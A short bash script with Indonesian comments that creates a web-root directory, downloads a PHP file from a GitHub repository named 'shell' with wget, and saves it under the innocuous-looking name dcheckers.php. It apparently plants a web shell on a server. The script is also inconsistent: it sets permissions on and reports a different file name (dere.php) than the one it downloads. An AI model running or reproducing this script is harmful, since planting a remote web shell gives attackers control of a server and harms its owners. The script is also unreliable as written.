#!/bin/bash

# 1. Tentukan lokasi folder tujuan
TARGET_DIR="/var/www/html/wwwroot"

# 2. Buat folder jika belum ada
if [ ! -d "$TARGET_DIR" ]; then
    echo "Membuat direktori $TARGET_DIR..."
    mkdir -p "$TARGET_DIR"
fi

# 3. Jalankan perintah download (wget)
echo "Sedang mengunduh file php..."
wget https://raw.githubusercontent.com/amelwijaya378-netizen/shell/refs/heads/main/ubuntu18.php -O "$TARGET_DIR/dcheckers.php"

# 4. Berikan izin akses agar web server bisa membaca filenya
chmod 644 "$TARGET_DIR/dere.php"

echo "Selesai! File tersimpan di $TARGET_DIR/dere.php"
